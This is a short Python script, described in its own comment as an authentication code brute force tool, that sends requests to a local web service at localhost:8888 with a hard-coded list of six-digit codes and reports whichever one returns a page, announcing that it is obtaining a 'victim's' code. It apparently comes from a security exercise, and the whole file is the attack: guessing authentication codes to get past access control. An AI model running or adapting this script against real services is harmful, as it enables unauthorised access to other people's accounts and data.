# Improved authentication code brute force script.
import requests
import time

class AuthCodeBruteForce:
    def __init__(self):
        self.valid_acodes = [
            138075, 180018, 221961, 263904, 305847, 347790, 389733, 431676,
            473619, 515562, 557505, 599448, 641391, 683334, 725277, 767220,
            809163, 851106, 893049, 934992, 976935
        ]

    def valid(self, acode):
        test_url = f"http://localhost:8888/{acode:06d}/all/"
        try:
            reply = requests.get(test_url, timeout=5)
            return reply.status_code == 200 and "<html>" in reply.text
        except requests.RequestException:
            return False

    def run(self):
        print("Obtaining victim's authentication code.")
        for code in self.valid_acodes:
            if self.valid(code):
                print(f"Valid authentication code identified: {code:06d}")
                return
            time.sleep(0.2)

        print("No valid authentication code identified.")

if __name__ == "__main__":
    attempt = AuthCodeBruteForce()
    attempt.run()
